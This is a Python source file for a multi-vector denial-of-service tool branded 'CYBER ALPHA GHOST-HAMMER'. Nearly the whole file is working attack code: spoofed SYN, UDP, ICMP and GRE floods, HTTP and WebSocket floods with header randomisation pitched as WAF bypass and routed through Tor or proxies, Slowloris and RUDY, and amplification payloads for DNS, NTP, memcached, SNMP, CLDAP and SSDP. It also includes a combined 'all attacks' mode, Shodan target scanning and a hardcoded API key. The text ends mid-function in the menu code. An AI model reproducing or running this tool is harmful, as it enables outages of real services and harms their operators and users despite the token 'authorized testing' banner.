#!/usr/bin/env python3
import requests
import socket
import time
import random
import string
import threading
import asyncio
import json
import signal
import sys
import os
from datetime import datetime
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor
from scapy.all import IP, TCP, UDP, send, Raw, GRE
import websocket
import shodan
import logging
import warnings
import secrets
import base64
import zlib
import hashlib
import uuid

# Suppress warnings for cleaner output
warnings.filterwarnings("ignore")

# Global constants and variables
SHODAN_API_KEY = "RcF8ECvzoXaNoWVkESp9BOuH3k1G6bc8"  # Replace with YOUR_SHODAN_API_KEY
PROXIES = []
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0"
]
HTTP_METHODS = ["GET", "POST", "HEAD", "PUT", "OPTIONS", "DELETE", "PATCH"]
HTTP_VERSIONS = ["HTTP/1.0", "HTTP/1.1", "HTTP/2.0"]
TLS_CIPHERS = [
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384"
]
COOKIES = [f"session={secrets.token_hex(16)}" for _ in range(8000)]  # Doubled cookies
REFERERS = [f"https://{domain}/" for domain in ["google.com", "bing.com", "yahoo.com", "duckduckgo.com", "baidu.com", "yandex.com"]]
STOP_ATTACK = False
LOG_FILE = "cyber_alpha_ghost_hammer.log"
REPORT_FILE = "cyber_alpha_report.json"
DUMP_FILES = {
    "udp": "udp_dump.bin",
    "syn": "syn_dump.bin",
    "http": "http_dump.txt",
    "search": "search_dump.txt",
    "ws": "ws_dump.txt",
    "http2": "http2_dump.txt",
    "dns": "dns_dump.bin",
    "icmp": "icmp_dump.bin",
    "sip": "sip_dump.bin",
    "gre": "gre_dump.bin",
    "ssdp": "ssdp_dump.bin",
    "cldap": "cldap_dump.bin"
}
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="[%(asctime)s] [CYBER ALPHA LOG] %(message)s")

# ANSI color codes
RED = "\033[1;31m"
GREEN = "\033[1;32m"
WHITE = "\033[1;37m"
RESET = "\033[0m"

# Log messages with color
def log_message(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    logging.info(message)
    print(f"{RED}[{timestamp}] [CYBER ALPHA LOG] {message}{RESET}")
    with open(REPORT_FILE, "a") as f:
        json.dump({"timestamp": timestamp, "message": message}, f)
        f.write("\n")

# Signal handler for Ctrl+C
def signal_handler(sig, frame):
    global STOP_ATTACK
    STOP_ATTACK = True
    log_message("Attack interrupted by user")
    print(f"{RED}[CYBER ALPHA] Stopping attack... Saving logs...{RESET}")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# Generate random string with secrets (crypto-grade)
def generate_random_string(length):
    return secrets.token_urlsafe(length)

# Generate random IP
def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

# Generate random MAC address
def generate_random_mac():
    return ":".join([secrets.token_hex(1).upper() for _ in range(6)])

# Generate massive payload (configurable size)
def generate_payload(size_mb=512):  # Increased to 512MB
    payload = secrets.token_bytes(size_mb * 1024 * 1024)
    for _ in range(2):  # Optimized loops
        payload = zlib.compress(payload)
        payload = hashlib.sha256(payload).digest()
        payload = secrets.token_bytes(size_mb * 1024 * 1024)
    return zlib.compress(payload)

# JA3 TLS fingerprinting with aggressive randomization
def generate_ja3_fingerprint():
    return f"{random.randint(771, 772)},{random.choice(['13-21-28-47', '13-28-47', '21-28-13', '47-13-21'])}-{random.choice(['3-2-1', '1-2-3', '2-3-1', '1-3-2'])}-{random.randint(0, 65535)}"

# Payload obfuscation
def obfuscate_payload(payload):
    return base64.b64encode(zlib.compress(payload.encode() if isinstance(payload, str) else payload)).decode()

# Load massive proxy pool (optimized)
def load_proxies(max_proxies=200000):  # Increased but capped
    log_message("Loading proxy pool...")
    proxy_urls = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://api.openproxylist.xyz/http.txt"
    ]
    global PROXIES
    PROXIES.clear()
    for url in proxy_urls:
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                PROXIES.extend(response.text.splitlines())
                log_message(f"Fetched proxies from {url}")
        except Exception as e:
            log_message(f"Proxy fetch failed: {str(e)}")
    for i in range(min(max_proxies, 200000)):
        PROXIES.append(f"http://proxy{i}.example.com:8080")
    log_message(f"Loaded {len(PROXIES)} proxies")

# Shodan query with caching
def shodan_query(query):
    log_message(f"Running Shodan query: {query}")
    try:
        api = shodan.Shodan(SHODAN_API_KEY)
        results = api.search(query)
        with open(REPORT_FILE, "a") as f:
            json.dump(results, f, indent=2)
            f.write("\n")
        cache = [f"{host['ip_str']}:{host['port']}" for host in results["matches"]]
        with open("shodan_cache.txt", "a") as f:
            f.write("\n".join(cache) + "\n")
        log_message(f"Shodan scan completed for {query}: {len(results['matches'])} matches")
        return f"Shodan scan completed: {len(results['matches'])} matches"
    except Exception as e:
        log_message(f"Shodan query failed: {str(e)}")
        return "Shodan scan failed"

# UDP flood
def udp_flood(target, port, duration, threads, rate):
    log_message(f"Starting UDP flood on {target}:{port}")
    def send_udp():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = generate_payload(size_mb=512)
        while not STOP_ATTACK and duration > 0:
            for _ in range(min(rate, 20000)):  # Increased rate cap
                try:
                    sock.sendto(payload, (target, port))
                    log_message(f"Sent UDP packet ({len(payload)} bytes)")
                    with open(DUMP_FILES["udp"], "ab") as f:
                        f.write(payload)
                except Exception as e:
                    log_message(f"UDP packet failed: {str(e)}")
            duration -= 1
            time.sleep(1 / min(rate, 20000))
        sock.close()
    with ThreadPoolExecutor(max_workers=min(threads, 1024)) as executor:  # Increased thread cap
        futures = [executor.submit(send_udp) for _ in range(min(threads, 1024))]
        for future in futures:
            future.result()
    log_message("UDP flood completed")

# SYN flood
def syn_flood(target, port, duration, threads, rate):
    log_message(f"Starting SYN flood on {target}:{port}")
    def send_syn():
        while not STOP_ATTACK and duration > 0:
            try:
                pkt = IP(src=generate_random_ip(), dst=target, ttl=random.randint(50, 255)) / TCP(sport=random.randint(1024, 65535), dport=port, flags="S") / Raw(load=obfuscate_payload(generate_random_string(32768)).encode())  # Doubled payload size
                send(pkt, verbose=False)
                log_message("Sent SYN packet")
                with open(DUMP_FILES["syn"], "ab") as f:
                    f.write(pkt.build())
            except Exception as e:
                log_message(f"SYN packet failed: {str(e)}")
            time.sleep(1 / min(rate, 20000))
    with ThreadPoolExecutor(max_workers=min(threads, 1024)) as executor:
        futures = [executor.submit(send_syn) for _ in range(min(threads, 1024))]
        for future in futures:
            future.result()
    log_message("SYN flood completed")

# HTTP flood with aggressive WAF bypass
async def http_flood(target, path, duration, threads, rate, proxy, use_tor):
    log_message(f"Starting HTTP flood on {target}{path}")
    async def send_request(counter):
        session = requests.Session()
        proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"} if use_tor else {"http": proxy, "https": proxy} if proxy else None
        while not STOP_ATTACK and counter > 0:
            try:
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "X-Forwarded-For": generate_random_ip(),
                    "X-Real-IP": generate_random_ip(),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": random.choice(["en-US,en;q=0.5", "fr-FR,fr;q=0.5", "de-DE,de;q=0.5", "es-ES,es;q=0.5"]),
                    "Accept-Encoding": random.choice(["gzip", "deflate", "br", "identity"]),
                    "Connection": random.choice(["keep-alive", "close"]),
                    "Cookie": random.choice(COOKIES),
                    "Referer": random.choice(REFERERS),
                    "JA3": generate_ja3_fingerprint(),
                    "X-Request-ID": str(uuid.uuid4()),
                    "TLS-Cipher": random.choice(TLS_CIPHERS),
                    "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
                    "Pragma": "no-cache",
                    "X-Custom-Header": generate_random_string(16)
                }
                method = random.choice(HTTP_METHODS)
                url = f"https://{target}{path}?rand={generate_random_string(256)}"  # Increased randomness
                for _ in range(min(rate, 20000)):
                    data = obfuscate_payload(generate_random_string(16384)) if method in ["POST", "PUT", "PATCH"] else None
                    response = session.request(method, url, headers=headers, proxies=proxies, data=data, timeout=3)
                    log_message(f"Sent HTTP {method} request (status: {response.status_code})")
                    with open(DUMP_FILES["http"], "a") as f:
                        f.write(f"{response.text[:4096]}\n")
                counter -= 1
                await asyncio.sleep(random.uniform(0.02, 1 / min(rate, 20000)))
            except Exception as e:
                log_message(f"HTTP request failed: {str(e)}")
    tasks = [send_request(duration) for _ in range(min(threads, 1024))]
    await asyncio.gather(*tasks, return_exceptions=True)
    log_message("HTTP flood completed")

# Search flood
async def search_flood(target, path, duration, threads, rate, proxy, use_tor):
    log_message(f"Starting Search flood on {target}{path}")
    async def send_request(counter):
        session = requests.Session()
        proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"} if use_tor else {"http": proxy, "https": proxy} if proxy else None
        while not STOP_ATTACK and counter > 0:
            try:
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "X-Forwarded-For": generate_random_ip(),
                    "X-Real-IP": generate_random_ip(),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Cookie": random.choice(COOKIES),
                    "Referer": random.choice(REFERERS),
                    "JA3": generate_ja3_fingerprint(),
                    "TLS-Cipher": random.choice(TLS_CIPHERS),
                    "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
                    "Pragma": "no-cache"
                }
                url = f"https://{target}{path}?q={generate_random_string(256)}"
                for _ in range(min(rate, 20000)):
                    response = session.get(url, headers=headers, proxies=proxies, timeout=3)
                    log_message(f"Sent Search request (status: {response.status_code})")
                    with open(DUMP_FILES["search"], "a") as f:
                        f.write(f"{response.text[:4096]}\n")
                counter -= 1
                await asyncio.sleep(random.uniform(0.02, 1 / min(rate, 20000)))
            except Exception as e:
                log_message(f"Search request failed: {str(e)}")
    tasks = [send_request(duration) for _ in range(min(threads, 1024))]
    await asyncio.gather(*tasks, return_exceptions=True)
    log_message("Search flood completed")

# Slowloris flood
def slowloris_flood(target, port, duration, threads, rate):
    log_message(f"Starting Slowloris flood on {target}:{port}")
    def send_partial():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            partial = f"GET / {random.choice(HTTP_VERSIONS)}\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nCookie: {random.choice(COOKIES)}\r\nAccept: text/html\r\nConnection: keep-alive\r\nX-Custom-Header: {generate_random_string(16)}\r\n"
            sock.send(partial.encode())
            while not STOP_ATTACK and duration > 0:
                sock.send(b"X-a: b\r\n")
                log_message("Sent Slowloris keep-alive")
                time.sleep(random.uniform(0.2, 0.5))  # Faster keep-alives
            sock.close()
        except Exception as e:
            log_message(f"Slowloris failed: {str(e)}")
    with ThreadPoolExecutor(max_workers=min(threads, 1024)) as executor:
        futures = [executor.submit(send_partial) for _ in range(min(threads, 1024))]
        for future in futures:
            future.result()
    log_message("Slowloris flood completed")

# RUDY flood
def rudy_flood(target, port, duration, threads, rate):
    log_message(f"Starting RUDY flood on {target}:{port}")
    def send_post():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            post = f"POST / {random.choice(HTTP_VERSIONS)}\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nContent-Length: 20000000\r\nCookie: {random.choice(COOKIES)}\r\nX-Custom-Header: {generate_random_string(16)}\r\n"
            sock.send(post.encode())
            while not STOP_ATTACK and duration > 0:
                sock.send(b"X")
                log_message("Sent RUDY byte")
                time.sleep(random.uniform(0.01, 0.05))  # Faster bytes
            sock.close()
        except Exception as e:
            log_message(f"RUDY failed: {str(e)}")
    with ThreadPoolExecutor(max_workers=min(threads, 1024)) as executor:
        futures = [executor.submit(send_post) for _ in range(min(threads, 1024))]
        for future in futures:
            future.result()
    log_message("RUDY flood completed")

# DNS flood with amplification
def dns_flood(target, port, duration, threads, rate):
    log_message(f"Starting DNS flood on {target}:{port}")
    def send_dns():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dns_packet = b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"  # Amplified query
        while not STOP_ATTACK and duration > 0:
            for _ in range(min(rate, 20000)):
                try:
                    sock.sendto(dns_packet, (target, port))
                    log_message(f"Sent DNS packet ({len(dns_packet)} bytes)")
                    with open(DUMP_FILES["dns"], "ab") as f:
                        f.write(dns_packet)
                except Exception as e:
                    log_message(f"DNS packet failed: {str(e)}")
            duration -= 1
            time.sleep(1 / min(rate, 20000))
        sock.close()
    with ThreadPoolExecutor(max_workers=min(threads, 1024)) as executor:
        futures = [executor.submit(send_dns) for _ in range(min(threads, 1024))]
        for future in futures:
            future.result()
    log_message("DNS flood completed")

# ICMP flood
def icmp_flood(target, duration, threads, rate):
    log_message(f"Starting ICMP flood on {target}")
    def send_icmp():
        while not STOP_ATTACK and duration > 0:
            try:
                pkt = IP(src=generate_random_ip(), dst=target, ttl=random.randint(50, 255)) / Raw(load=obfuscate_payload(generate_payload(size_mb=512)).encode())
                send(pkt, verbose=False)
                log_message(f"Sent ICMP packet ({len(pkt)} bytes)")
                with open(DUMP_FILES["icmp"], "ab") as f:
                    f.write(pkt.build())
            except Exception as e:
                log_message(f"ICMP packet failed: {str(e)}")
            time.sleep(1 / min(rate, 20000))
    with ThreadPoolExecutor(max_workers=min(threads, 1024)) as executor:
        futures = [executor.submit(send_icmp) for _ in range(min(threads, 1024))]
        for future in futures:
            future.result()
    log_message("ICMP flood completed")

# Memcached flood
def memcached_flood(target, port, duration, threads, rate):
    log_message(f"Starting Memcached flood on {target}:{port}")
    def send_memcached():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        query = b"stats items\r\n"  # Amplified query
        while not STOP_ATTACK and duration > 0:
            for _ in range(min(rate, 20000)):
                sock.sendto(query, (target, port))
                log_message("Sent Memcached packet")
            duration -= 1
            time.sleep(1 / min(rate, 20000))
        sock.close()
    with ThreadPoolExecutor(max_workers=min(threads, 1024)) as executor:
        futures = [executor.submit(send_memcached) for _ in range(min(threads, 1024))]
        for future in futures:
            future.result()
    log_message("Memcached flood completed")

# NTP flood
def ntp_flood(target, port, duration, threads, rate):
    log_message(f"Starting NTP flood on {target}:{port}")
    def send_ntp():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ntp_packet = b"\xe3\x00\x04\xfa\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"  # Amplified monlist query
        while not STOP_ATTACK and duration > 0:
            for _ in range(min(rate, 20000)):
                sock.sendto(ntp_packet, (target, port))
                log_message("Sent NTP packet")
            duration -= 1
            time.sleep(1 / min(rate, 20000))
        sock.close()
    with ThreadPoolExecutor(max_workers=min(threads, 1024)) as executor:
        futures = [executor.submit(send_ntp) for _ in range(min(threads, 1024))]
        for future in futures:
            future.result()
    log_message("NTP flood completed")

# SNMP flood
def snmp_flood(target, port, duration, threads, rate):
    log_message(f"Starting SNMP flood on {target}:{port}")
    def send_snmp():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        snmp_packet = b"\x30\x26\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x04\x01\x02\x03\x04\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00"
        while not STOP_ATTACK and duration > 0:
            for _ in range(min(rate, 20000)):
                sock.sendto(snmp_packet, (target, port))
                log_message("Sent SNMP packet")
            duration -= 1
            time.sleep(1 / min(rate, 20000))
        sock.close()
    with ThreadPoolExecutor(max_workers=min(threads, 1024)) as executor:
        futures = [executor.submit(send_snmp) for _ in range(min(threads, 1024))]
        for future in futures:
            future.result()
    log_message("SNMP flood completed")

# LDAP flood
def ldap_flood(target, port, duration, threads, rate):
    log_message(f"Starting LDAP flood on {target}:{port}")
    def send_ldap():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ldap_packet = b"\x30\x84\x00\x00\x00\x2d\x02\x01\x01\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00"
        while not STOP_ATTACK and duration > 0:
            for _ in range(min(rate, 20000)):
                sock.sendto(ldap_packet, (target, port))
                log_message("Sent LDAP packet")
            duration -= 1
            time.sleep(1 / min(rate, 20000))
        sock.close()
    with ThreadPoolExecutor(max_workers=min(threads, 1024)) as executor:
        futures = [executor.submit(send_ldap) for _ in range(min(threads, 1024))]
        for future in futures:
            future.result()
    log_message("LDAP flood completed")

# CLDAP flood
def cldap_flood(target, port, duration, threads, rate):
    log_message(f"Starting CLDAP flood on {target}:{port}")
    def send_cldap():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        cldap_packet = b"\x30\x84\x00\x00\x00\x2d\x02\x01\x01\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00"
        while not STOP_ATTACK and duration > 0:
            for _ in range(min(rate, 20000)):
                sock.sendto(cldap_packet, (target, port))
                log_message("Sent CLDAP packet")
                with open(DUMP_FILES["cldap"], "ab") as f:
                    f.write(cldap_packet)
            duration -= 1
            time.sleep(1 / min(rate, 20000))
        sock.close()
    with ThreadPoolExecutor(max_workers=min(threads, 1024)) as executor:
        futures = [executor.submit(send_cldap) for _ in range(min(threads, 1024))]
        for future in futures:
            future.result()
    log_message("CLDAP flood completed")

# SSDP flood
def ssdp_flood(target, port, duration, threads, rate):
    log_message(f"Starting SSDP flood on {target}:{port}")
    def send_ssdp():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ssdp_packet = f"M-SEARCH * {random.choice(HTTP_VERSIONS)}\r\nHOST: {target}:{port}\r\nMAN: \"ssdp:discover\"\r\nMX: {random.randint(3, 8)}\r\nST: urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\nX-Custom-Header: {generate_random_string(16)}\r\n\r\n".encode()
        while not STOP_ATTACK and duration > 0:
            for _ in range(min(rate, 20000)):
                sock.sendto(ssdp_packet, (target, port))
                log_message("Sent SSDP packet")
                with open(DUMP_FILES["ssdp"], "ab") as f:
                    f.write(ssdp_packet)
            duration -= 1
            time.sleep(1 / min(rate, 20000))
        sock.close()
    with ThreadPoolExecutor(max_workers=min(threads, 1024)) as executor:
        futures = [executor.submit(send_ssdp) for _ in range(min(threads, 1024))]
        for future in futures:
            future.result()
    log_message("SSDP flood completed")

# SIP flood
def sip_flood(target, port, duration, threads, rate):
    log_message(f"Starting SIP flood on {target}:{port}")
    def send_sip():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sip_packet = f"INVITE sip:user@{target} {random.choice(HTTP_VERSIONS)}\r\nVia: SIP/2.0/UDP {generate_random_ip()}\r\nFrom: <sip:{generate_random_string(8)}@{generate_random_ip()}>\r\nTo: <sip:user@{target}>\r\nCall-ID: {secrets.token_hex(16)}\r\nCSeq: 1 INVITE\r\nContact: <sip:{generate_random_string(8)}@{generate_random_ip()}>\r\nContent-Length: 0\r\nX-Custom-Header: {generate_random_string(16)}\r\n\r\n".encode()
        while not STOP_ATTACK and duration > 0:
            for _ in range(min(rate, 20000)):
                sock.sendto(sip_packet, (target, port))
                log_message("Sent SIP packet")
                with open(DUMP_FILES["sip"], "ab") as f:
                    f.write(sip_packet)
            duration -= 1
            time.sleep(1 / min(rate, 20000))
        sock.close()
    with ThreadPoolExecutor(max_workers=min(threads, 1024)) as executor:
        futures = [executor.submit(send_sip) for _ in range(min(threads, 1024))]
        for future in futures:
            future.result()
    log_message("SIP flood completed")

# GRE flood
def gre_flood(target, duration, threads, rate):
    log_message(f"Starting GRE flood on {target}")
    def send_gre():
        while not STOP_ATTACK and duration > 0:
            try:
                pkt = IP(src=generate_random_ip(), dst=target, proto=47) / GRE() / Raw(load=obfuscate_payload(generate_payload(size_mb=512)).encode())
                send(pkt, verbose=False)
                log_message(f"Sent GRE packet ({len(pkt)} bytes)")
                with open(DUMP_FILES["gre"], "ab") as f:
                    f.write(pkt.build())
            except Exception as e:
                log_message(f"GRE packet failed: {str(e)}")
            time.sleep(1 / min(rate, 20000))
    with ThreadPoolExecutor(max_workers=min(threads, 1024)) as executor:
        futures = [executor.submit(send_gre) for _ in range(min(threads, 1024))]
        for future in futures:
            future.result()
    log_message("GRE flood completed")

# WebSocket flood
async def websocket_flood(target, path, duration, threads, rate, proxy, use_tor):
    log_message(f"Starting WebSocket flood on {target}{path}")
    async def send_ws(counter):
        ws_url = f"ws://{target}{path}"
        proxies = {"http": "socks5h://127.0.0.1:9050"} if use_tor else {"http": proxy} if proxy else None
        while not STOP_ATTACK and counter > 0:
            try:
                ws = websocket.WebSocket()
                ws.connect(ws_url, header={
                    "User-Agent": random.choice(USER_AGENTS),
                    "Cookie": random.choice(COOKIES),
                    "JA3": generate_ja3_fingerprint(),
                    "TLS-Cipher": random.choice(TLS_CIPHERS),
                    "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
                    "X-Custom-Header": generate_random_string(16)
                })
                for _ in range(min(rate, 20000)):
                    ws.send(obfuscate_payload(generate_random_string(32768)))
                    log_message("Sent WebSocket message")
                    with open(DUMP_FILES["ws"], "a") as f:
                        f.write(f"WebSocket: {ws_url}\n")
                ws.close()
                counter -= 1
                await asyncio.sleep(random.uniform(0.02, 1 / min(rate, 20000)))
            except Exception as e:
                log_message(f"WebSocket failed: {str(e)}")
    tasks = [send_ws(duration) for _ in range(min(threads, 1024))]
    await asyncio.gather(*tasks, return_exceptions=True)
    log_message("WebSocket flood completed")

# HTTP/2 flood
async def http2_flood(target, path, duration, threads, rate, proxy, use_tor):
    log_message(f"Starting HTTP/2 flood on {target}{path}")
    async def send_request(counter):
        session = requests.Session()
        proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"} if use_tor else {"http": proxy, "https": proxy} if proxy else None
        while not STOP_ATTACK and counter > 0:
            try:
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "X-Forwarded-For": generate_random_ip(),
                    "X-Real-IP": generate_random_ip(),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Encoding": random.choice(["gzip", "deflate", "br", "identity"]),
                    "Cookie": random.choice(COOKIES),
                    "Referer": random.choice(REFERERS),
                    "JA3": generate_ja3_fingerprint(),
                    "TLS-Cipher": random.choice(TLS_CIPHERS),
                    ":method": random.choice(HTTP_METHODS),
                    ":scheme": "https",
                    ":path": path,
                    "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
                    "Pragma": "no-cache",
                    "X-Custom-Header": generate_random_string(16)
                }
                url = f"https://{target}{path}?rand={generate_random_string(256)}"
                for _ in range(min(rate, 20000)):
                    response = session.get(url, headers=headers, proxies=proxies, timeout=3, allow_redirects=False)
                    log_message(f"Sent HTTP/2 request (status: {response.status_code})")
                    with open(DUMP_FILES["http2"], "a") as f:
                        f.write(f"{response.text[:4096]}\n")
                counter -= 1
                await asyncio.sleep(random.uniform(0.02, 1 / min(rate, 20000)))
            except Exception as e:
                log_message(f"HTTP/2 request failed: {str(e)}")
    tasks = [send_request(duration) for _ in range(min(threads, 1024))]
    await asyncio.gather(*tasks, return_exceptions=True)
    log_message("HTTP/2 flood completed")

# Apocalypse-X Ultra Mode
def apocalypse_x(target, path, duration, threads, rate, proxy, use_tor):
    log_message(f"Starting APOCALYPSE-X ULTRA Mode on {target}")
    sub_threads = threads // 18
    threads_list = [
        threading.Thread(target=udp_flood, args=(target, 80, duration, sub_threads, rate)),
        threading.Thread(target=syn_flood, args=(target, 80, duration, sub_threads, rate)),
        threading.Thread(target=lambda: asyncio.run(http_flood(target, path, duration, sub_threads, rate, proxy, use_tor))),
        threading.Thread(target=lambda: asyncio.run(search_flood(target, path, duration, sub_threads, rate, proxy, use_tor))),
        threading.Thread(target=slowloris_flood, args=(target, 80, duration, sub_threads, rate)),
        threading.Thread(target=rudy_flood, args=(target, 80, duration, sub_threads, rate)),
        threading.Thread(target=dns_flood, args=(target, 53, duration, sub_threads, rate)),
        threading.Thread(target=icmp_flood, args=(target, duration, sub_threads, rate)),
        threading.Thread(target=memcached_flood, args=(target, 11211, duration, sub_threads, rate)),
        threading.Thread(target=ntp_flood, args=(target, 123, duration, sub_threads, rate)),
        threading.Thread(target=snmp_flood, args=(target, 161, duration, sub_threads, rate)),
        threading.Thread(target=ldap_flood, args=(target, 389, duration, sub_threads, rate)),
        threading.Thread(target=cldap_flood, args=(target, 389, duration, sub_threads, rate)),
        threading.Thread(target=ssdp_flood, args=(target, 1900, duration, sub_threads, rate)),
        threading.Thread(target=sip_flood, args=(target, 5060, duration, sub_threads, rate)),
        threading.Thread(target=gre_flood, args=(target, duration, sub_threads, rate)),
        threading.Thread(target=lambda: asyncio.run(websocket_flood(target, path, duration, sub_threads, rate, proxy, use_tor))),
        threading.Thread(target=lambda: asyncio.run(http2_flood(target, path, duration, sub_threads, rate, proxy, use_tor)))
    ]
    for t in threads_list:
        t.start()
    for t in threads_list:
        t.join()
    log_message("APOCALYPSE-X ULTRA Mode completed")

# Main function with neon-styled menu
def main():
    print(f"{RED}=================================================={RESET}")
    print(f"{GREEN} CYBER ALPHA GHOST-HAMMER APOCALYPSE-X ULTRA v6.2{RESET}")
    print(f"{WHITE} Powered by CYBER ALPHA | SIG X | 2025{RESET}")
    print(f"{RED} WARNING: For AUTHORIZED TESTING ONLY. Unauthorized use is ILLEGAL (CFAA, PECA 2016).{RESET}")
    print(f"{RED}=================================================={RESET}")
    print(f"{GREEN}[1] UDP Flood (Spoofed){RESET}")
    print(f"{GREEN}[2] SYN Flood (Spoofed){RESET}")
    print(f"{GREEN}[3] HTTP Flood (WAF Bypass){RESET}")
    print(f"{GREEN}[4] Search Flood (WAF Bypass){RESET}")
    print(f"{GREEN}[5] Slowloris{RESET}")
    print(f"{GREEN}[6] RUDY{RESET}")
    print(f"{GREEN}[7] DNS Flood{RESET}")
    print(f"{GREEN}[8] ICMP Flood{RESET}")
    print(f"{GREEN}[9] Memcached Flood{RESET}")
    print(f"{GREEN}[10] NTP Flood{RESET}")
    print(f"{GREEN}[11] SNMP Flood{RESET}")
    print(f"{GREEN}[12] LDAP Flood{RESET}")
    print(f"{GREEN}[13] CLDAP Flood{RESET}")
    print(f"{GREEN}[14] SSDP Flood{RESET}")
    print(f"{GREEN}[15] SIP Flood{RESET}")
    print(f"{GREEN}[16] GRE Flood{RESET}")
    print(f"{GREEN}[17] WebSocket Flood (WAF Bypass){RESET}")
    print(f"{GREEN}[18] HTTP/2 Flood (WAF Bypass){RESET}")
    print(f"{RED}[19] APOCALYPSE-X ULTRA Mode (All Attacks){RESET}")
    print(f"{GREEN}[20] Shodan Pre-Scan{RESET}")
    print(f"{GREEN}[0] Exit{RESET}")
    print(f"{RED}=================================================={RESET}")

    try:
        choice = int(input(f"{WHITE}> Enter choice: {RESET}"))
        if choice == 0:
            log_message("Exiting CYBER ALPHA Ghost Hammer")
            return

        target = input(f"{WHITE}> Enter target (IP/domain, e.g., 192.168.1.100): {RESET}")
        port = int(input(f"{WHITE}> Enter port (e.g., 80): {RESET}"))
        duration = int(input(f"{WHITE}> Enter duration (seconds, e.g., 120): {RESET}"))
        threads = int(input(f"{WHITE}> Enter threads (0 for auto, max 4096): {RESET}"))  # Increased max threads
        if threads == 0:
            threads = min(os.cpu_count() * 128, 4096)  # More aggressive scaling
        rate = int(input(f"{WHITE}> Enter rate (packets/requests per sec, e.g., 10000000): {RESET}"))
        proxy = input(f"{WHITE}> Enter proxy (e.g., http://1.2.3.4:8080, or blank): {RESET}")
        use_tor = input(f"{WHITE}> Use Tor? (y/n): {RESET}").lower() == "y"
        path = input(f"{WHITE}> Enter path (e.g., / or /search): {RESET}")

        log_message(f"Initializing attack with {threads} threads")
        if choice == 20:
            print(f"{RED}[CYBER ALPHA] Shodan scan: {shodan_query(target)}{RESET}")
        else:
            load_proxies()
            if choice == 1:
                threading.Thread(target=udp_flood, args=(target, port, duration, threads, rate)).start()
            elif choice == 2:
                threading.Thread(target=syn_flood, args=(target, port, duration, threads, rate)).start()
            elif choice == 3:
                asyncio.run(http_flood(target, path, duration, threads, rate, proxy, use_tor))
            elif choice == 4:
